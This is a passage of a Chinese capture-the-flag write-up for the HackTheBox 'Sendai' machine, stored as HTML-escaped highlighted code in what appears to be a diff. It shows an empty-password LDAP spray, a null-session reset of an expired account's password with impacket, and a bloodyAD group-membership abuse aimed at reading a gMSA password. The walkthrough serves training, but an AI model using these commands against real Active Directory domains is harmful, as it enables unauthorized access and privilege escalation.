+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  it                                  D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Tue Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 09:16:46 &lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  legal                               D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Tue Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; 08:58:23 &lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  security                            D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Tue Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 09:17:35 &lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  transfer                            D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Tue Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; 09:00:20 &lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#ae81ff&#34;&gt;7019007&lt;/span&gt; blocks of size 4096. &lt;span style=&#34;color:#ae81ff&#34;&gt;852101&lt;/span&gt; blocks available
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;smb: &lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;gt;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;重置密码&#34;&gt;重置密码
+&lt;/h2&gt;&lt;p&gt;还有一些文本文件，重点则是如下&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;事件通知（incident.txt）
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;亲爱的员工们：
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;希望您一切安好。我们在此通知一项关于用户账户密码的重要安全更新。
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;近期，我们进行了全面的渗透测试，发现大量用户账户使用了弱且不安全的密码。
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;为了解决这一问题并维护公司内部最高等级的安全性，IT 部门已采取紧急措施：所有使用不安全密码的用户账户已被强制过期。
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;这意味着，受影响的用户在下次登录时必须重置密码。
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;我们诚挚地请求所有受影响的用户尽快完成密码重置流程，以确保系统的安全性和完整性。请记住，强密码在保护敏感信息和抵御潜在威胁方面起着至关重要的作用。
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;如果您在重置密码过程中需要帮助，或有任何相关问题，请随时联系 IT 支持团队。他们将非常乐意为您提供指导和必要的支持。
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;感谢您为维护我们共同的安全环境所做的配合与努力。您对安全规范的警惕与遵守为我们的整体安全作出了重要贡献。
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我之前经历过获得的用户是初始密码过期的目标用户，但是当时我已经获得了此用户的原始密码，所以我有权限直接通过远程修改密码，但是这次不太一样，我只能初步判断，目标用户的账户和密码应该是一样的，为了验证这一块，我需要rid爆破获取近乎所有用户，之后直接空密码爆破可以&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/sendai&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ nxc ldap $ip -u users -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; --continue-on-success
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Windows Server &lt;span style=&#34;color:#ae81ff&#34;&gt;2022&lt;/span&gt; Build &lt;span style=&#34;color:#ae81ff&#34;&gt;20348&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;name:DC&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;domain:sendai.vl&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;signing:None&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;channel binding:Never&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrator: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Error in searchRequest -&amp;gt; operationsError: 000004DC: LdapErr: DSID-0C090D10, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\G&lt;/span&gt;uest: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\k&lt;/span&gt;rbtgt: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;C$: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;qlsvc: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\w&lt;/span&gt;ebsvc: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;orothy.Jones: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\K&lt;/span&gt;erry.Robinson: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\N&lt;/span&gt;aomi.Gardner: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;nthony.Smith: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\S&lt;/span&gt;usan.Harper: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\S&lt;/span&gt;tephen.Simpson: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\M&lt;/span&gt;arie.Gallagher: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\K&lt;/span&gt;athleen.Kelly: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\N&lt;/span&gt;orman.Baxter: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\J&lt;/span&gt;ason.Brady: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\E&lt;/span&gt;lliot.Yates: STATUS_PASSWORD_MUST_CHANGE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\M&lt;/span&gt;alcolm.Smith: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\L&lt;/span&gt;isa.Williams: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\R&lt;/span&gt;oss.Sullivan: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\C&lt;/span&gt;lifford.Davey: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;eclan.Jenkins: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\L&lt;/span&gt;awrence.Grant: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\L&lt;/span&gt;eslie.Johnson: 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以看到Elliot.Yates是一个过期用户，我尝试使用nxc直接修改密码，但是失败了，所以我开始枚举&lt;a class=&#34;link&#34; href=&#34;https://www.n00py.io/2021/09/resetting-expired-passwords-remotely/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;这篇文章&lt;/a&gt;他引导我到了impacket的一个pull工单，让我意识到changepass.py使用ms-rpc更改是个能绕过的办法&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/sendai&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ impacket-changepasswd sendai.vl/Elliot.Yates:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;@$ip -newpass wackMaker1!
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Current password: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Changing the password of sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\E&lt;/span&gt;lliot.Yates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Connecting to DCE/RPC as sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\E&lt;/span&gt;lliot.Yates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Password is expired or must be changed, trying to bind with a null session.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Connecting to DCE/RPC as null session
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Password was changed successfully.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当我查看参数直接键入密码的时候，成功更改完毕，我们的连接也正常&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/sendai&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ nxc smb $ip -u Elliot.Yates -p wackMaker1!
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Windows Server &lt;span style=&#34;color:#ae81ff&#34;&gt;2022&lt;/span&gt; Build &lt;span style=&#34;color:#ae81ff&#34;&gt;20348&lt;/span&gt; x64 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;name:DC&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;domin:sendai.vl&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;signing:True&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Null Auth:True&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\E&lt;/span&gt;lliot.Yates:wackMaker1! 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可惜没有winrm权限，但是我们有足够的凭据抓取猎犬了&lt;/p&gt;
+&lt;p&gt;因为我懒得贴图片，所以直接口语描述路径了&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ELLIOT.YATES@SENDAI.VL属于support组，而这个组对admsvc组有通用all权限，admsvc组对MGTSVC$@SENDAI.VL这个用户有读gmsa的权限
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;很简单的流程，将自己加入组，直接读gmsa&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/sendai&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ bloodyAD --host $FQDN --dc-ip $ip -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$domain&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$pass&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; add groupMember ADMSVC &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Elliot.Yates added to ADMSVC
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/sendai&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
